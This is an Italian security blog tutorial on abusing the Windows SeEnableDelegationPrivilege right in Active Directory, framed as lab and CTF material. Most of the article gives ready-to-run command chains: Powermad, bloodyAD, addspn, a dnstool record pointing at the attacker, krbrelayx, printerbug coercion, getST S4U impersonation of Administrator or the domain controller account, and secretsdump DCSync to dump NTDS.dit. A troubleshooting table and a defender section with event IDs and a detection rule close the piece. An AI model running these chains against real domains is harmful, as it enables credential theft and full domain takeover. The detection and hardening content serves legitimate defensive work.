---
title: 'SeEnableDelegationPrivilege: privesc AD, S4U e delega'
slug: seenabledelegationprivilege
description: 'Cos’è SeEnableDelegationPrivilege, privilege escalation , varianti unconstrained/constrained/RBCD, S4U2Self-S4U2Proxy, errori, detection e difesa.'
image: /seenabledelegationprivilege-active-directory.webp
draft: false
date: 2026-07-18T00:00:00.000Z
categories:
  - windows
subcategories:
  - privilege-escalation
tags:
  - delegation
  - s4u
  - rbcd
  - constrained-delegation
  - unconstrained-delegation
---

# SeEnableDelegationPrivilege in Active Directory: guida completa a delega Kerberos, S4U e privesc

Se stai facendo un lab di [Active Directory](https://hackita.it/articoli/active-directory/) (Hack The Box, VulnLab, o un ambiente autorizzato) e BloodHound ti mostra che il tuo utente ha il privilegio **SeEnableDelegationPrivilege**, ti starai chiedendo cos'è esattamente e se è sfruttabile. In breve: è un diritto di Windows che decide chi, nel dominio, può far "impersonare" un utente da un altro account verso un servizio — un meccanismo chiamato delega Kerberos, pensato per usi legittimi ma che diventa un bersaglio di privesc molto potente in mani sbagliate.

SeEnableDelegationPrivilege è uno di quei privilegi di Active Directory che spesso sembrano secondari in BloodHound, ma che in un lab autorizzato possono diventare il punto d'ingresso per una catena di abuso molto potente. In questa guida vediamo in modo chiaro e pratico quando basta da solo e quando serve un altro appiglio, come funzionano davvero delega non vincolata (unconstrained), vincolata (constrained) e RBCD, perché S4U2Self e S4U2Proxy sono il cuore della tecnica, cosa significano i valori di `userAccountControl` che compaiono nei tool, e quali errori, log e segnali usare per riconoscerla anche lato difesa.

**Due scenari pratici, due strade diverse — non confonderle.** Scenario 1, delega non vincolata (unconstrained): la usi quando puoi creare un account macchina nuovo (o ne controlli uno esistente) E puoi forzare una vittima ad autenticarsi verso di te — più rumorosa, richiede coercion. Scenario 2, delega vincolata (constrained): la usi quando hai `GenericAll`/`GenericWrite` su un account macchina già esistente, senza bisogno di aspettare o forzare nessuno — più diretta, ed è il caso più comune nei lab. Se non sai quale ti serve, salta alla sezione [Le tre varianti di delega a confronto](#le-tre-varianti-di-delega-a-confronto) prima di lanciare qualsiasi comando.

## Cos'è SeEnableDelegationPrivilege

È un **diritto utente** (user right) di Windows, assegnato di default solo ai Domain Admins. Chi lo possiede decide quali account (utenti o computer) sono autorizzati a "impersonare" altri utenti verso servizi specifici del dominio — meccanismo noto come **delega Kerberos (Kerberos Delegation)**.

Scenario legittimo tipico: un utente si autentica su un server web (livello 1), e quel server deve accedere a un database (livello 2) *come se fosse l'utente*, senza che l'utente reinserisca le credenziali. Serve un modo per il server web di "farsi passare" per l'utente verso il database — questo è delegazione.

Il problema: chi ha `SeEnableDelegationPrivilege` può configurare **qualsiasi** account per fare questo, inclusi account che controlla lui stesso. Diventa una scorciatoia diretta verso il Domain Admin.

## Prerequisiti reali: quando basta da solo e quando no

Questo è il punto che quasi nessun articolo chiarisce bene. `SeEnableDelegationPrivilege` da solo ti dà **un solo potere**: la capacità di impostare gli attributi di delega (`msDS-AllowedToDelegateTo`, i flag di `userAccountControl`) su un oggetto AD. Non ti dà automaticamente il controllo di un account su cui applicarli.

Per completare l'attacco ti serve **anche uno di questi**:

* **Per la via non vincolata (unconstrained)**: la capacità di creare un nuovo account macchina (`SeMachineAccountPrivilege` più `MachineAccountQuota > 0`), oppure il controllo di un account computer/utente già esistente
* **Per la via vincolata (constrained)**: `GenericAll` o `GenericWrite` su un account (utente o computer) di cui puoi già gestire credenziali, oppure il possesso diretto di credenziali/hash di un account esistente

Verifica sempre con BloodHound cosa controlli realmente: cerca edge di [ACL abuse](https://hackita.it/articoli/acl-abuse/) come `GenericAll`/`GenericWrite` verso oggetti Computer, partendo dal tuo utente compromesso, e controlla se `whoami /priv` mostra anche [SeMachineAccountPrivilege](https://hackita.it/articoli/semachineaccountquota/). Se `SeEnableDelegationPrivilege` è l'unico privilegio che hai, senza nessun altro controllo, la strada è bloccata — devi prima trovare un modo per ottenere quel controllo (es. reset password via gruppo Helpdesk, abuso ACL, ecc.).

## Le tre varianti di delega a confronto

| Variante                                                       | Serve account macchina nuovo?                              | SPN richiesto?                                                                                       | Rischio                             | Quando usarla                                                                                                                   | Limiti principali                                                                                                                                                                                     |
| -------------------------------------------------------------- | ---------------------------------------------------------- | ---------------------------------------------------------------------------------------------------- | ----------------------------------- | ------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Non vincolata (Unconstrained)**                              | Sì (o un account esistente compromesso, utente o computer) | No sull'attributo di delega, ma serve un SPN che punti al tuo host per far arrivare l'autenticazione | Molto alto — furto di QUALSIASI TGT | Se puoi anche forzare una vittima ad autenticarsi (coercion)                                                                    | Bloccata se `MachineAccountQuota=0` e non hai già un account da riusare; serve coercion (PrinterBug/Coercer/PetitPotam)                                                                               |
| **Vincolata (Constrained)**                                    | No, riusa un account esistente su cui hai controllo        | Sì, specifico in `msDS-AllowedToDelegateTo`                                                          | Alto ma mirato                      | Caso più comune nei lab: hai `GenericAll`/`GenericWrite` su un account macchina                                                 | In teoria solo verso l'SPN autorizzato, ma il nome del servizio nel ticket è testo modificabile lato client (vedi sezione SPN più sotto), quindi spesso si estende ad altri servizi sullo stesso host |
| **[RBCD](https://hackita.it/articoli/rbcd/) (Resource-Based)** | Sì, se serve un account "attaccante"                       | Sì, ma configurato sul lato del bersaglio                                                            | Alto                                | Quando controlli l'attributo `msDS-AllowedToActOnBehalfOfOtherIdentity` del bersaglio (non serve `SeEnableDelegationPrivilege`) | Richiede `MachineAccountQuota > 0` per creare un account, oppure un account esistente da usare come "attaccante"                                                                                      |

`SeEnableDelegationPrivilege` è coinvolto solo nelle prime due varianti — con RBCD la configurazione sta dal lato del servizio bersaglio, e basta il permesso di scrittura su quel singolo attributo, non serve questo privilegio a livello di dominio.

## Enumerare gli account già configurati per delega

Prima di configurare qualcosa tu, vale la pena controllare se qualche account nel dominio è **già** impostato per la delega (spesso per errore o per configurazioni legacy). Il modo più rapido resta una raccolta dati con [SharpHound](https://hackita.it/articoli/sharphound/) seguita da un'analisi in [BloodHound](https://hackita.it/articoli/bloodhound/), ma esistono anche strade manuali via Impacket:

```bash
findDelegation.py dominio.local/hackita:'Hackita123'
```

Oppure via PowerShell, filtrando sull'attributo che indica delega non vincolata:

```powershell
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' -Properties serviceprincipalname
```

Se trovi già un account con questo flag attivo e ne hai le credenziali, puoi saltare direttamente alla fase di coercion, senza doverlo configurare tu da zero.

## Esempio pratico completo: delega non vincolata (Unconstrained)

Questo scenario richiede sia `SeEnableDelegationPrivilege` sia la possibilità di controllare un account computer (idealmente `SeMachineAccountPrivilege` per crearne uno nuovo e pulito).

### Percorso Windows (PowerShell / Powermad)

**1. Crea un account macchina** (richiede `MachineAccountQuota > 0`):

```powershell
Import-Module .\Powermad.ps1
New-MachineAccount -MachineAccount HACKITA -Password $(ConvertTo-SecureString 'Hackita123' -AsPlainText -Force)
```

**2. Abilita la delega non vincolata sull'account appena creato**, sommando i flag come visto sopra (`524288 + 4096 = 528384`):

```powershell
Set-MachineAccountAttribute -MachineAccount HACKITA -Attribute useraccountcontrol -Value 528384
```

**3. Aggiungi un SPN plausibile**, per far sembrare l'account un servizio legittimo:

```powershell
Set-MachineAccountAttribute -MachineAccount HACKITA -Attribute ServicePrincipalName -Value HTTP/HACKITA.dominio.local -Append
```

**4. Registra un record DNS** che faccia puntare quell'hostname alla tua macchina attaccante:

```bash
dnstool.py -u 'dominio.local\HACKITA$' -p 'Hackita123' -r HACKITA.dominio.local -d <IP-ATTACCANTE> -a add <IP-DC> -dns-ip <IP-DC>
```

Dai qualche minuto perché il record si propaghi, poi verifica con `nslookup HACKITA.dominio.local <IP-DC>`.

**5. Metti in ascolto krbrelayx**, passandogli l'hash NT dell'account HACKITA$ — dato che la password l'hai impostata tu stesso al passo 1, basta calcolarlo da quella con `pypykatz crypto nt 'Hackita123'`:

```bash
krbrelayx.py -hashes :<HASH-NT-DI-HACKITA$>
```

**6. Forza il Domain Controller ad autenticarsi verso il tuo host finto**, con il PrinterBug (abuso del servizio di spooling remoto):

```bash
printerbug.py 'dominio.local/HACKITA$:Hackita123'@<IP-DC> HACKITA.dominio.local
```

Se il DC si connette, `krbrelayx` cattura e salva il suo TGT in un file `.ccache` (es. `DC$@DOMINIO.LOCAL_krbtgt@DOMINIO.LOCAL.ccache`).

**7. Usa quel TGT per un DCSync completo:**

```bash
KRB5CCNAME='DC$@DOMINIO.LOCAL_krbtgt@DOMINIO.LOCAL.ccache' secretsdump.py -k -no-pass dominio.local -just-dc
```

Da qui esce l'intero NTDS.dit: Domain Admin raggiunto.

### Percorso Linux (Impacket / bloodyAD)

Stessa logica, tool diversi — utile quando lavori solo da Kali senza Evil-WinRM. Per la modifica degli attributi useremo [bloodyAD](https://hackita.it/articoli/bloodyad/), che gestisce da solo la somma dei flag su `userAccountControl` invece di farteli calcolare a mano:

```bash
# 1) Crea l'account macchina
addcomputer.py dominio.local/hackita:'Hackita123' -computer-name hackita -computer-pass 'Hackita123'

# 2) Imposta i flag di delega non vincolata via bloodyAD (uno alla volta, si sommano da soli)
bloodyAD -u 'hackita' -p 'Hackita123' --host dc.dominio.local -d dominio.local add uac 'hackita$' -f TRUSTED_FOR_DELEGATION
bloodyAD -u 'hackita' -p 'Hackita123' --host dc.dominio.local -d dominio.local add uac 'hackita$' -f WORKSTATION_TRUST_ACCOUNT

# 3) Aggiungi gli SPN HTTP e CIFS al computer appena creato
addspn.py -u 'dominio.local\hackita' -p 'Hackita123' -s 'HTTP/hackita.dominio.local' -t 'hackita$' -dc-ip <IP-DC> dc.dominio.local
addspn.py -u 'dominio.local\hackita' -p 'Hackita123' -s 'CIFS/hackita.dominio.local' -t 'hackita$' -dc-ip <IP-DC> dc.dominio.local

# 4) Metti in ascolto krbrelayx con l'hash dell'account hackita$
krbrelayx.py -hashes :<HASH-NT>

# 5) Coercizione (printerbug o, in alternativa, il tool "coercer" che prova più tecniche insieme)
printerbug.py 'dominio.local/hackita$:Hackita123'@<IP-DC> hackita.dominio.local

# 6) DCSync mirato su un singolo utente, usando il TGT catturato
KRB5CCNAME='DC$@DOMINIO.LOCAL_krbtgt@DOMINIO.LOCAL.ccache' secretsdump.py -k -no-pass dominio.local -just-dc-user Administrator
```

**Nota bene sugli account computer vs account utente**: un account computer può aggiungere da sé i propri SPN (per questo negli esempi sopra `addspn` funziona senza problemi). Un account **utente** normale, invece, non può modificare il proprio `servicePrincipalName` — se l'account con delega non vincolata che hai compromesso è un utente, ti serve un secondo account con `GenericAll`/`GenericWrite` su quell'utente per potergli assegnare l'SPN giusto. È una distinzione che quasi nessuna guida sottolinea, ma cambia completamente la fattibilità dell'attacco a seconda del tipo di account che hai in mano.

## SPN, in breve: la base che ti serve per capire tutto il resto

Un **SPN (Service Principal Name)** è semplicemente l'identificatore univoco con cui Kerberos riconosce un servizio su un host — nel formato `servizio/hostname` (es. `cifs/dc.dominio.local`, `ldap/dc.dominio.local`, `http/srv01.dominio.local`). Quando chiedi un ticket "per il servizio CIFS del DC", stai chiedendo un ticket per quello specifico SPN. Nell'attacco non vincolato visto sopra, il motivo per cui serve un SPN che punti al TUO host è che la vittima (il DC) deve "credere" di parlare con un servizio legittimo quando in realtà ti sta consegnando il proprio TGT.

Punto chiave anche per la delega vincolata: **il nome del servizio dentro un ticket di servizio (TGS) è testo in chiaro**, non protetto in modo da impedirne la modifica lato client in alcuni tool. Questo è il motivo per cui puoi spesso ottenere un ticket per `cifs/dc.dominio.local` e poi richiederne uno modificato per `ldap/` o `http/` sullo stesso host, anche se in `msDS-AllowedToDelegateTo` avevi autorizzato solo `cifs`.

## Perché la delega non vincolata spesso non è praticabile

Se non hai già un account computer/utente su cui puoi applicare `TRUSTED_FOR_DELEGATION`, il primo istinto sarebbe crearne uno nuovo. Il problema: creare un nuovo account macchina richiede quota (`MachineAccountQuota`), che in molti ambienti moderni è impostata a **0**.

```bash
netexec ldap dc.dominio.local -u hackita -p 'Hackita123' -M maq
```

Se il risultato è `MachineAccountQuota: 0` e non hai già il controllo di nessun account esistente, quella strada è chiusa — si passa alla delega vincolata.

## La strada pratica: delega vincolata su un account esistente

Scenario tipico: BloodHound mostra che il tuo utente ha `SeEnableDelegationPrivilege` a livello di dominio, e in più ha `GenericAll` su un account macchina esistente — chiamiamolo `HACKITA$`.

### Step 1 — Abilita il flag di delega sull'account macchina

```powershell
Set-ADAccountControl -Identity "HACKITA$" -TrustedToAuthForDelegation $True
```

Imposta il flag `TRUSTED_TO_AUTH_FOR_DELEGATION`: "questo account può impersonare altri utenti verso i servizi che gli permetterò di raggiungere, anche partendo da un'autenticazione non-Kerberos (protocol transition)".

**Nota importante**: esiste anche una variante detta "Kerberos only", senza protocol transition — in quel caso questo flag NON viene impostato, e S4U2Self non produce un ticket "forwardable" da solo. Nella stragrande maggioranza dei walkthrough e delle CTF, la variante con protocol transition è quella che troverai.

### Step 2 — Definisci verso quale servizio può delegare

```powershell
Set-ADObject -Identity "CN=HACKITA,CN=COMPUTERS,DC=DOMINIO,DC=LOCAL" -Add @{"msDS-AllowedToDelegateTo"="cifs/dc.dominio.local"}
```

`cifs/` (protocollo SMB) verso il DC apre la strada a `secretsdump` più avanti. Ma non è l'unica opzione utile:

* **`ldap/dc.dominio.local`** → accesso LDAP con privilegi dell'utente impersonato, utile per query dirette o, se impersoni un account con permessi replica, persino DCSync via LDAP
* **`host/dc.dominio.local`** → apre accesso a un ventaglio più ampio di operazioni WMI/scheduled task
* **`http/dc.dominio.local`** → utile se il bersaglio espone servizi web/WinRM management
* **`wsman/dc.dominio.local`** o **`host/`** combinato con il trucco SPN (vedi sopra) → accesso PowerShell Remoting (Evil-WinRM/WinRM) direttamente come utente impersonato

### Step 3 — Prendi il controllo dell'account macchina

```bash
netexec smb dc.dominio.local -u hackita -p 'Hackita123' -M change-password -o USER='HACKITA$' NEWPASS='Hackita123'
```

### Step 4 — Il cuore dell'attacco: S4U2Self e S4U2Proxy, spiegati a fondo

Qui arriva la parte che pochi spiegano davvero bene.

**Perché serve un TGT, non basta una password?** In [Kerberos](https://hackita.it/articoli/kerberos/), ogni richiesta di ticket di servizio (TGS) parte da un TGT valido. Il TGT dimostra "questo account si è autenticato con successo", il TGS dimostra "questo account è autorizzato per questo specifico servizio". `getST.py` fa entrambi i passaggi per te: prima ottiene un TGT per l'account macchina compromesso, poi lo usa per il resto della catena.

**S4U2Self**: permette al tuo account macchina di ottenere un ticket di servizio *per se stesso*, per conto di un altro utente — anche senza che quell'utente si sia mai autenticato. Il KDC (il Domain Controller) si fida del nome utente che gli fornisci in questa richiesta: non serve la password dell'Administrator, basta il nome. Il risultato è un ticket "forwardable" (grazie al flag impostato allo Step 1) che dimostra "Administrator ha parlato con me".

**Perché S4U2Self da solo non basta**: quel ticket dimostra solo che il tuo account macchina "conosce" l'Administrator — ti autentica come il tuo account macchina verso se stesso, non ti dà accesso a nient'altro. Serve il passo successivo per trasformarlo in qualcosa di utile.

**S4U2Proxy**: prende quel ticket forwardable ottenuto con S4U2Self e lo scambia con un secondo ticket, valido per il servizio che hai autorizzato in `msDS-AllowedToDelegateTo`. Qui il KDC controlla **esplicitamente** quell'attributo: se il servizio richiesto non è nella lista, la richiesta fallisce con `KDC_ERR_BADOPTION`. Questo è il motivo per cui S4U2Proxy "dipende" da quell'attributo — è il gate che decide se la delega è permessa o no.

Comando pratico con Impacket:

```bash
getST.py 'dominio.local/HACKITA$:Hackita123' -spn cifs/dc.dominio.local -impersonate administrator
```

Ottieni un ticket salvato in un file `.ccache` — agli occhi del servizio CIFS del DC, quel ticket **È** l'Administrator.

**Se impersonare `administrator` fallisce con `KDC_ERR_BADOPTION` anche con tutto configurato bene**: quasi sempre significa che l'account Administrator è protetto — flag `NOT_DELEGATED` ("account is sensitive and cannot be delegated") attivo, o membro del gruppo **Protected Users**. Questo dice esplicitamente al DC "questo utente non deve mai comparire come impersonato in un ticket S4U", indipendentemente da quanto sia ben configurata la delega. Non è un errore tuo — è una protezione voluta su quell'account specifico, e la trovi spesso già attiva di default sulle macchine più recenti.

In quel caso, la strada resta comunque aperta: invece di impersonare `administrator`, impersona **`dc`** — cioè l'account macchina del Domain Controller stesso (`DC$`), che di norma non ha quella protezione:

```bash
getST.py 'dominio.local/HACKITA$:Hackita123' -spn ldap/dc.dominio.local -impersonate dc
```

Un account macchina di un Domain Controller ha naturalmente i permessi di replica sul dominio — quindi un ticket LDAP ottenuto impersonandolo è sufficiente per un DCSync completo, esattamente come se avessi impersonato Administrator con successo. Nota che qui serve un `msDS-AllowedToDelegateTo` verso `ldap/`, non `cifs/`, perché il DCSync via LDAP passa dal protocollo di replica di Active Directory. Questo è esattamente lo scenario della macchina HTB Redelegate — trovi il walkthrough completo [qui](https://hackita.it/articoli/htb-redelegate-walkthrough).

### Step 5 — Usa il ticket per dumpare le credenziali

```bash
KRB5CCNAME=administrator@cifs_dc.dominio.local@DOMINIO.LOCAL.ccache secretsdump.py -k -no-pass dc.dominio.local
```

Da qui esce l'intero NTDS.dit — hash NTLM e chiavi Kerberos di ogni account, incluso l'Administrator, tramite [secretsdump](https://hackita.it/articoli/secretsdump/) e più in generale [credential dumping](https://hackita.it/articoli/credential-dumping/). Da lì, autenticazione diretta con [wmiexec](https://hackita.it/articoli/wmiexec/) o Evil-WinRM usando l'hash: Domain Admin raggiunto.

## I numeri di userAccountControl, spiegati (finalmente)

I valori numerici che vedi nei tool tipo Powermad (`Set-MachineAccountAttribute ... useraccountcontrol -Value 528384`) non sono a caso: sono **somme di flag binari**, ognuno rappresenta una caratteristica dell'account.

| Flag                               | Valore decimale | Significato                                                                           |
| ---------------------------------- | --------------- | ------------------------------------------------------------------------------------- |
| WORKSTATION\_TRUST\_ACCOUNT        | 4096            | L'account è un computer normale unito al dominio                                      |
| TRUSTED\_FOR\_DELEGATION           | 524288          | Delega NON vincolata abilitata                                                        |
| TRUSTED\_TO\_AUTH\_FOR\_DELEGATION | 16777216        | Delega vincolata con protocol transition abilitata                                    |
| NOT\_DELEGATED                     | 1048576         | L'account è protetto: NON può mai essere impersonato via delega (vedi sezione difesa) |

`524288 + 4096 = 528384` — cioè "account computer normale" + "delega non vincolata attiva", sommati.

Per la delega vincolata via `Set-ADAccountControl`, PowerShell gestisce la somma per te. Ma con tool più diretti (Powermad, bloodyAD, LDAP raw) e modifica manuale di `useraccountcontrol`, **devi sommare tu i flag** (o applicarli uno alla volta come fa bloodyAD, che li somma automaticamente ai flag esistenti) — altrimenti rischi di sovrascrivere un flag già presente invece di aggiungerlo. Questo è l'errore più comune, e produce sintomi Kerberos poco chiari a valle.

## Troubleshooting: errori comuni

| Errore                                                                | Causa probabile                                                                                                              | Controllo rapido                                                    | Fix                                                                                                                         |
| --------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------- |
| `KDC_ERR_BADOPTION` in S4U2Proxy                                      | `msDS-AllowedToDelegateTo` non impostato o SPN sbagliato/non esistente                                                       | `Get-ADComputer HACKITA$ -Properties msDS-AllowedToDelegateTo`      | Reimposta l'attributo con lo SPN corretto ed esatto                                                                         |
| `KDC_ERR_BADOPTION` con messaggio "SPN non delegabile"                | Manca `TRUSTED_TO_AUTH_FOR_DELEGATION` sull'account                                                                          | `Get-ADComputer HACKITA$ -Properties userAccountControl`            | Riapplica `Set-ADAccountControl -TrustedToAuthForDelegation $True`, oppure somma bene i flag se usi valori numerici manuali |
| `rpc_s_access_denied` durante printerbug                              | Normale in molte versioni patchate: il coercion via spooler può fallire silenziosamente ma comunque innescare il backconnect | Controlla comunque se `krbrelayx` ha ricevuto una connessione       | Se non arriva nulla, prova `coercer` (prova più tecniche PetitPotam/DFSCoerce insieme) invece del solo printerbug           |
| `KRB_AP_ERR_SKEW`                                                     | Differenza di orario tra la tua macchina e il DC (Kerberos tollera pochi minuti)                                             | Confronta `date` locale con l'orario del DC                         | `sudo ntpdate -u <ip-dc>` prima di ogni tentativo                                                                           |
| `KRB_AP_ERR_MODIFIED`                                                 | Spesso conseguenza indiretta di clock skew non risolto del tutto, o ticket corrotto                                          | Rilancia dopo aver risincronizzato l'orario                         | Risincronizza e riprova; se persiste, rigenera il ticket da zero                                                            |
| `MachineAccountQuota: 0` durante tentativo di creare un account nuovo | Quota disabilitata per policy                                                                                                | `netexec ldap dc -u hackita -p 'Hackita123' -M maq`                 | Non creare un account nuovo — usa un account esistente su cui hai `GenericAll`/`GenericWrite`                               |
| `STATUS_ACCESS_DENIED` su `secretsdump` nonostante il ticket S4U      | L'utente impersonato non ha davvero i permessi di replica (es. non è Domain Admin)                                           | Verifica i permessi effettivi dell'utente impersonato su BloodHound | Impersona un account con permessi di replica reali, o usa `-just-dc-user` per un singolo account                            |

## Detection e difesa (Blue Team)

Chi gestisce un dominio Active Directory dovrebbe monitorare e limitare su più livelli:

**Riduzione della superficie**

* Assegnare `SeEnableDelegationPrivilege` ai soli account Tier-0 realmente necessari
* Impostare `MachineAccountQuota` a 0 dove non serve creare account macchina self-service
* Marcare gli account privilegiati (Domain Admins, account di servizio Tier-0) con il flag **"Account is sensitive and cannot be delegated"** (`NOT_DELEGATED`, valore 1048576) e inserirli nel gruppo **Protected Users** — questo impedisce a S4U2Self di produrre un ticket forwardable per loro, interrompendo la catena all'origine

**Monitoraggio e detection**

* **Event ID 4704**: assegnazione di un diritto utente sensibile. Una regola di detection minima (usata anche da Elastic Security) è banale da scrivere: `event.code:4704 and winlog.event_data.PrivilegeList:"SeEnableDelegationPrivilege"` — qualunque SIEM può implementarla in pochi minuti
* **Event ID 4738 / 4742**: modifica di un account utente/computer — controllare in particolare variazioni di `msDS-AllowedToDelegateTo`
* **Event ID 5136**: modifica di un oggetto directory — utile per intercettare scritture su `msDS-AllowedToActOnBehalfOfOtherIdentity` (RBCD) o sugli attributi di delega
* **Event ID 4769**: richiesta di ticket di servizio Kerberos — un S4U2Self si riconosce quando le informazioni sull'account richiedente e sul servizio richiesto coincidono; un S4U2Proxy successivo mostra il campo "Transited Services" valorizzato
* Auditing periodico via BloodHound dei privilegi di delega esistenti nel dominio, non solo al setup iniziale

A livello di framework, questa tecnica è mappata su MITRE ATT\&CK sotto **Credential Access / Steal or Forge Kerberos Tickets (T1558)** e **Persistence / Account Manipulation (T1098)** — utile se stai integrando le detection in un sistema che classifica per tattiche/tecniche.

## Domande frequenti

**SeEnableDelegationPrivilege basta da solo per fare privesc?**
No. Ti serve anche il controllo (credenziali, `GenericAll`/`GenericWrite`, o la possibilità di creare un account macchina) su almeno un oggetto su cui applicare la configurazione di delega.

**Qual è la differenza principale con RBCD?**
Con la delega vincolata classica, i permessi si configurano sull'account che "delega" (serve `SeEnableDelegationPrivilege`). Con RBCD, si configurano sul lato del servizio bersaglio (`msDS-AllowedToActOnBehalfOfOtherIdentity`), e non serve questo privilegio a livello di dominio.

**Perché MachineAccountQuota blocca la strada più semplice?**
Perché la delega non vincolata "pulita" di solito richiede di creare un account macchina nuovo da configurare. Se la quota è 0 e non hai già un account su cui applicare `TRUSTED_FOR_DELEGATION`, sei costretto a riusare un account esistente controllato, il che spesso ti porta dritto alla delega vincolata.

**Perché uso cifs invece di ldap?**
`cifs/` verso il DC ti dà accesso SMB alle share amministrative, sufficiente per `secretsdump` via DRSUAPI. `ldap/` è utile se l'obiettivo è una query diretta o un attacco tipo DCSync via LDAP — dipende da cosa vuoi fare con il ticket ottenuto.

**La delega non vincolata funziona anche su account utente, non solo computer?**
Sì, ma con una differenza pratica importante: un account computer può auto-assegnarsi un SPN, un account utente no. Se l'account con delega non vincolata è un utente, serve un secondo account con `GenericAll`/`GenericWrite` su di esso per potergli impostare l'SPN necessario a far arrivare la coercion.

## Tecniche correlate

* **RBCD**: stessa famiglia di attacco ma senza bisogno di `SeEnableDelegationPrivilege`, utile quando controlli direttamente l'oggetto bersaglio
* **Abuso di account computer via Shadow Credentials**: un'alternativa per prendere il controllo di un account macchina quando hai `GenericWrite`/`GenericAll` ma preferisci un certificato invece di cambiare la password
* **DCSync**: spesso il passo finale una volta ottenuto un ticket (o un TGT rubato) impersonando un account con permessi di replica

## Conclusione

`SeEnableDelegationPrivilege` è uno di quei privilegi che su BloodHound sembra innocuo — non salta all'occhio come `GenericAll` su un DC. Ma combinato anche solo con `GenericAll`/`GenericWrite` su un singolo account esistente (o con la possibilità di crearne uno nuovo), è una strada diretta e silenziosa verso il Domain Admin, senza crackare hash né sfruttare vulnerabilità software. Capire S4U2Self e S4U2Proxy — e la logica dietro la variante non vincolata — a fondo, non solo copiare il comando, è quello che fa la differenza tra eseguire un attacco e saperlo anche diagnosticare quando qualcosa va storto.

## Fonti e approfondimenti

* Microsoft Learn — [Protocol Transition with Constrained Delegation Technical Supplement](https://learn.microsoft.com/en-us/previous-versions/msp-n-p/ff650469\(v=pandp.10\))
